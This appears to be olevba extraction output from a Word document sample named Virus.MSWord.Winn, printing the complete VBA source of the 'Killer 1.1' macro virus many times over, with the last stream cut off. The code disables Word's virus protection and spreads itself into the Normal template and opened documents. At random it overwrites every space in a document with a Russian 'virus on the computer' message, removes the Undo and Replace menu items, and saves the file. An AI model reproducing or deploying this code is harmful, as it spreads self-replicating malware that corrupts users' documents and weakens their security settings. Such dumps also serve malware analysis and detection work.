olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Winn
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO killer.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer1.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer2.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer3.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer4.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer5.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer6.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer7.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer8.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer9.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer10.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer11.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer12.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer13.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer13'
